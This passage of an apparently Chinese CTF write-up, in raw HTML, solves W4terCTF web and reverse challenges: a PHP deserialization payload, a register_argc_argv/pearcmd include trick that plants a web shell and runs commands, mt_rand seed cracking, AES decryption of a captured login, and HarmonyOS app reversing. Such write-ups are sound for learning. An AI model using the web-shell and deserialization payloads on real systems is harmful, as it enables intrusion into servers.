class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$payload</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$best</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;payload：\\n\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$payload</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    </span></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503204222.png\"\n                      alt=\"微信图片_20250503204222\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag_piece_1: W4terCTF&#123;i5_pHp</span><br></pre></td></tr></table></figure>\n<h3 id=\"part2\"><a href=\"#part2\" class=\"headerlink\" title=\"part2\"></a>part2</h3><p>进到 /1nCLud3.php 目录下</p>\n<p>根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER[‘QUERY_STRING’]在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。</p>\n<p>根据提示：register_argc_argv=On，找到博客<a class=\"link\"   href=\"https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/\" >register_argc_argv与include to RCE的巧妙组合 - Longlone’s Blog<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<p>和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：</p>\n<p>“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令。”</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=pearcmd&amp;+config-create+/&lt;?phpsystem($_GET[&#x27;cmd&#x27;]);?&gt;+/tmp/evil.php</span><br></pre></td></tr></table></figure>\n<p>因为浏览器会将&lt; ? &gt; 转义，所以通过burpsuite抓包后再GET传参</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504135809.png\"\n                      alt=\"微信图片_20250504135809\"\n                ></p>\n<p>这便拿到了cmd的控制权，随后查找剩下的flag</p>\n<p>通过include打开evil.php继续利用cmd</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/tmp/evil&amp;cmd=ls /tmp</span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504140529.png\"\n                      alt=\"微信图片_20250504140529\"\n                ></p>\n<p>再配合通配符绕过一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/tmp/evil&amp;cmd=cat /tmp/f*lag2.txt</span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504140829.png\"\n                      alt=\"微信图片_20250504140829\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag_piece2: _The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;i5_pHp_The_SA1E57_IaN9Ua63_in_tH3_wOr1D?_3nJoyyy_1t!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"Front-End\"><a href=\"#Front-End\" class=\"headerlink\" title=\"Front End\"></a>Front End</h2><p>密码的web题</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155416.png\"\n                      alt=\"微信图片_20250504155416\"\n                ></p>\n<p>base64编码</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155524.png\"\n                      alt=\"微信图片_20250504155524\"\n                ></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155559.png\"\n                      alt=\"微信图片_20250504155559\"\n                ></p>\n<p>打开 /hint.html</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155659.png\"\n                      alt=\"微信图片_20250504155659\"\n                ></p>\n<p>看到注释——JavaScript 混淆表达式。在控制台运行一下，得到encode.php</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504155944.png\"\n                      alt=\"微信图片_20250504155944\"\n                ></p>\n<p>来到密码的部分</p>\n<p>根据</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504160243.png\"\n                      alt=\"微信图片_20250504160243\"\n                ></p>\n<p>这一部分的判断逻辑，如果变量 rand 等于0 就输出加密后的内容。</p>\n<p>根据 rand 的定义，传递参数 r = 1537101982</p>\n<p>得到了调用两次encrypt的加密结果：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Encrypted: 253430495677694834376a30334d7643476e42466b36457a5672714649736d326b626d4c33666f4b6e546c7a324c583857396331543079 </span><br><span class=\"line\">Encrypted: 4f59355430674b38334631497243574c6b58394d46486d706d4249384b5a3230344d4c776d476a5431585a64774f5852747a507779</span><br></pre></td></tr></table></figure>\n<p>而在php语言中，mt_rand()生成随机数的方式一般是根据时间戳，如果固定了种子，调用mt_srand(seed)后，mt_rand()生成的随机数序列是不变的。可以得出第一次调用 mt_rand()得到的值等于r，即 1537101982。</p>\n<p>网上查阅资料可知，可从生成的随机数序列倒推种子。运行脚本后得到：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504160818.png\"\n                      alt=\"微信图片_20250504160818\"\n                ></p>\n<p>得出了几个满足条件的种子，正向地用这些种子生成随机数序列</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$seeds</span> = [<span class=\"number\">997887998</span>, <span class=\"number\">1741048634</span>, <span class=\"number\">2753486577</span>, <span class=\"number\">3026673652</span>, <span class=\"number\">4268323880</span>];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$seeds</span> <span class=\"keyword\">as</span> <span class=\"variable\">$seed</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Seed: <span class=\"subst\">$seed</span>\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">mt_srand</span>(<span class=\"variable\">$seed</span>);  </span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$rand1</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"variable\">$rand2</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"variable\">$rand3</span> = <span class=\"title function_ invoke__\">mt_rand</span>();  </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;rand1: <span class=\"subst\">$rand1</span>, rand2: <span class=\"subst\">$rand2</span>, rand3: <span class=\"subst\">$rand3</span>\\n&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$seed_enc</span> = <span class=\"variable\">$rand2</span> + <span class=\"variable\">$rand3</span> * <span class=\"number\">1000000000</span>;  <span class=\"comment\">//得到加密中需要使用的种子</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;Seed Encrypted: <span class=\"subst\">$seed_enc</span>\\n&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;\\n&quot;</span>;  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 656981344086716842</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 139121407568507466</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1604674039149147684</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1782694585991376243</span></span><br><span class=\"line\"><span class=\"comment\">//Seed Encrypted: 1520982203885732553</span></span><br></pre></td></tr></table></figure>\n<p>最后再根据原文的加密逻辑倒推flag：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$chars</span>     = <span class=\"string\">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@!&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$chars_map</span> = <span class=\"title function_ invoke__\">array_flip</span>(<span class=\"title function_ invoke__\">str_split</span>(<span class=\"variable\">$chars</span>));</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">decrypt</span>(<span class=\"params\"><span class=\"variable\">$encrypted_text</span>, <span class=\"variable\">$seed</span>, <span class=\"variable\">$chars</span>, <span class=\"variable\">$chars_map</span></span>) </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//$encrypted_text = urldecode($encrypted_text);//url解码</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$ch</span>  = <span class=\"variable\">$encrypted_text</span>[<span class=\"number\">0</span>];</span><br><span class=\"line\">    <span class=\"variable\">$nh</span>  = <span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$chars</span>, <span class=\"variable\">$ch</span>);<span class=\"comment\">//首字符的位置确定rand()产生的随机数</span></span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"string\">&quot;nh: <span class=\"subst\">&#123;$nh&#125;</span>\\n&quot;</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"variable\">$encrypted_body</span> = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$encrypted_text</span>, <span class=\"number\">1</span>);<span class=\"comment\">//实际加密数据</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">    <span class=\"comment\">//根据加密逻辑倒推</span></span><br><span class=\"line\">    <span class=\"variable\">$mdKey_full</span> = <span class=\"title function_ invoke__\">md5</span>((<span class=\"keyword\">string</span>)<span class=\"variable\">$seed</span> . <span class=\"variable\">$ch</span>);</span><br><span class=\"line\">    <span class=\"variable\">$start</span>      = <span class=\"variable\">$nh</span> % <span class=\"number\">8</span>;</span><br><span class=\"line\">    <span class=\"variable\">$length</span>     = <span class=\"variable\">$start</span> + <span class=\"number\">7</span>;           </span><br><span class=\"line\">    <span class=\"variable\">$mdKey</span>      = <span class=\"title function_ invoke__\">substr</span>(<span class=\"variable\">$mdKey_full</span>, <span class=\"variable\">$start</span>, <span class=\"variable\">$length</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$k</span>    = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"variable\">$tmp</span>  = <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$keyL</span> = <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$mdKey</span>);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$encrypted_body</span>); <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$c</span>       = <span class=\"variable\">$encrypted_body</span>[<span class=\"variable\">$i</span>];</span><br><span class=\"line\">        <span class=\"variable\">$k</span>       = <span class=\"variable\">$k</span> % <span class=\"variable\">$keyL</span>;</span><br><span class=\"line\">        <span class=\"variable\">$ci</span>      = <span class=\"variable\">$chars_map</span>[<span class=\"variable\">$c</span>];</span><br><span class=\"line\">        <span class=\"comment\">// j = (ci - nh - ord(mdKey[k])) mod 64</span></span><br><span class=\"line\">        <span class=\"variable\">$j</span>       = (<span class=\"variable\">$ci</span> - <span class=\"variable\">$nh</span> - <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$mdKey</span>[<span class=\"variable\">$k</span>]) + <span class=\"number\">64</span>*<span class=\"number\">2</span>) % <span class=\"number\">64</span>;</span><br><span class=\"line\">        <span class=\"variable\">$tmp</span>    .= <span class=\"variable\">$chars</span>[<span class=\"variable\">$j</span>];</span><br><span class=\"line\">        <span class=\"variable\">$k</span>++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"variable\">$tmp</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$seed</span>    = <span class=\"string\">&#x27;1782694585991376243&#x27;</span>;<span class=\"comment\">//手动更换计算得到的seed，wp为正确的seed</span></span><br><span class=\"line\"><span class=\"variable\">$cipher1</span> = <span class=\"string\">&quot;OY5T0gK83F1IrCWLkX9MFHmpmBI8KZ204MLwmGjT1XZdwOXRtzPwy&quot;</span>;</span><br><span class=\"line\"><span class=\"comment\">//这里我已经先将加密的内容从转为转为了字节，并恢复了一些字符即url解码。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$encoded</span> = <span class=\"title function_ invoke__\">decrypt</span>(<span class=\"variable\">$cipher1</span>, <span class=\"variable\">$seed</span>, <span class=\"variable\">$chars</span>, <span class=\"variable\">$chars_map</span>);</span><br><span class=\"line\"><span class=\"variable\">$flag</span>    = <span class=\"title function_ invoke__\">base64_decode</span>(<span class=\"variable\">$encoded</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;[+] Decrypted flag: <span class=\"subst\">&#123;$flag&#125;</span>\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>可成功解密flag</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504162719128.png\"\n                      alt=\"image-20250504162719128\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">W4terCTF&#123;A1b_fROn7EnD_kEep5_8rEwinG&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"REVERSE\"><a href=\"#REVERSE\" class=\"headerlink\" title=\"REVERSE\"></a>REVERSE</h1><h2 id=\"网站管理员的登录密码\"><a href=\"#网站管理员的登录密码\" class=\"headerlink\" title=\"网站管理员的登录密码\"></a>网站管理员的登录密码</h2><p>根据提示需要找到<strong>成功登录</strong>的密码</p>\n<p>打开.pcapng，定位POST请求下的login流量包。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504163434.png\"\n                      alt=\"微信图片_20250504163434\"\n                ></p>\n<p>状态显示登陆成功，接下来只需要破解这段密码即可。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504163921288.png\"\n                      alt=\"image-20250504163921288\"\n                ></p>\n<p>找到了密码的加密方式，用一个密钥和一个初始向量，AES加密</p>\n<p>对应地写个解密脚本</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> unpad</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密密钥和初始向量</span></span><br><span class=\"line\">key = <span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&quot;4ede70b7e44ffcc7cd912685defd05b1&quot;</span>)</span><br><span class=\"line\">iv = <span class=\"built_in\">bytes</span>.fromhex(<span class=\"string\">&quot;c63b909a63ecdbbe813181e3c4734d87&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密后的密文（Base64 编码）</span></span><br><span class=\"line\">encrypted_text = <span class=\"string\">&quot;gBjV3cE/UXEm7fXGXbQ4O7bXJEwi0y68SGNjkhuV2RW43lkkKm+xNQzpJDlfgCFOoAvOd0Ff1bg3Je4zbAAEdWpe8DmRdf5wH2F9vhAuDpg=&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将 Base64 编码的密文解码为字节</span></span><br><span class=\"line\">encrypted_bytes = base64.b64decode(encrypted_text)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建 AES 解密器</span></span><br><span class=\"line\">cipher = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密并去除填充</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">    decrypted_bytes = cipher.decrypt(encrypted_bytes)</span><br><span class=\"line\">    decrypted_text = unpad(decrypted_bytes, AES.block_size).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密后的文本:&quot;</span>, decrypted_text)</span><br><span class=\"line\"><span class=\"keyword\">except</span> ValueError <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;解密失败:&quot;</span>, e)</span><br></pre></td></tr></table></figure>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504164403519.png\"\n                      alt=\"image-20250504164403519\"\n                ></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;Fr0N73Nd!_17&#x27;5_my_5ymM3trlC_3ncrYpt1On!!!!!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"和谐小APP\"><a href=\"#和谐小APP\" class=\"headerlink\" title=\"和谐小APP\"></a>和谐小APP</h2><p>参考了这篇博客：<a class=\"link\"   href=\"https://www.52pojie.cn/thread-1973595-1-1.html\" >鸿蒙逆向 - SHCTF - Android？Harmony！题解 - 吾爱破解 - 52pojie.cn<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<p>先将.hap文件改为.zip后缀解压</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504164803915.png\"\n                      alt=\"image-20250504164803915\" style=\"zoom:50%;\" \n                ></p>\n<p>找到.abc文件，用abc反编译工具打开。在 entryability 下定位到 W4terCTF：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504165220376.png\"\n                      alt=\"image-20250504165220376\"\n                ></p>\n<p>这段反编译的结果大致是说，如果 trim == “flag”，trim2 ==”W4terCTF{…}”，就会触发彩蛋。而彩蛋是从“libentry.so”中导入的guessWhat函数在 输入是trim2，种子是20250428 的条件下生成的。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">orz = import &#123; default as orz &#125; from &quot;@normalized:Y&amp;&amp;&amp;libentry.so&amp;&quot;;</span><br><span class=\"line\">obj4.message = orz.guessWhat(trim2, 20250428);</span><br></pre></td></tr></table></figure>\n<p>那么就定位到 libentry.so 文件。用 IDA 打开，定位到guesswhat函数</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504170855720.png\"\n                      alt=\"image-20250504170855720\"\n                ></p>\n<p>找到了函数的实际入口地址，F5一下，反编译代码主要逻辑如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">napi_get_value_string_utf8</span>(a1, v18, s1, 128LL, v13);<span class=\"comment\">//字符串</span></span><br><span class=\"line\"><span class=\"title function_\">napi_get_value_double</span>(a1, *((_QWORD *)&amp;v18 + <span class=\"number\">1</span>), &amp;v12);<span class=\"comment\">//数字</span></span><br><span class=\"line\">                      </span><br><span class=\"line\"><span class=\"comment\">//对传入的两个参数进行一些变换</span></span><br><span class=\"line\">v4 = <span class=\"number\">5</span> * (int)v12;</span><br><span class=\"line\">  v5 = <span class=\"number\">15</span> * (int)v12;</span><br><span class=\"line\">  v6 = <span class=\"number\">20</span> * (int)v12;</span><br><span class=\"line\">  v7 = <span class=\"number\">10</span> * (int)v12;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = 0LL; ; i += 20LL )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i) ^= v3;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( i &gt; <span class=\"number\">0x77</span> )</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">5</span>) ^= v4 + v3;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">10</span>) ^= v7 + v3;</span><br><span class=\"line\">    *(_DWORD *)((char *)s1 + i + <span class=\"number\">15</span>) ^= v5 + v3;</span><br><span class=\"line\">    v3 += v6;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//最后判断变换后的变量是否与target相等</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (!<span class=\"title function_\">bcmp</span>(s1, &amp;target, <span class=\"number\">0x80</span>))</span><br><span class=\"line\">    v8 = &amp;unk_910;  <span class=\"comment\">// 成功提示</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    v8 = &amp;unk_91C;  <span class=\"comment\">// 失败提示</span></span><br></pre></td></tr></table></figure>\n<p>所以下面就是要去找到 target</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"image-20250504172003259.png\"\n                      alt=\"image-20250504172003259\"\n                ></p>\n<p>提取出target的所有字节，并基于上面的变换逻辑恢复出flag即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\"></span><br><span class=\"line\">target_bytes = <span class=\"built_in\">bytes</span>([</span><br><span class=\"line\">    <span class=\"number\">0x57</span>, <span class=\"number\">0x34</span>, <span class=\"number\">0x74</span>, <span 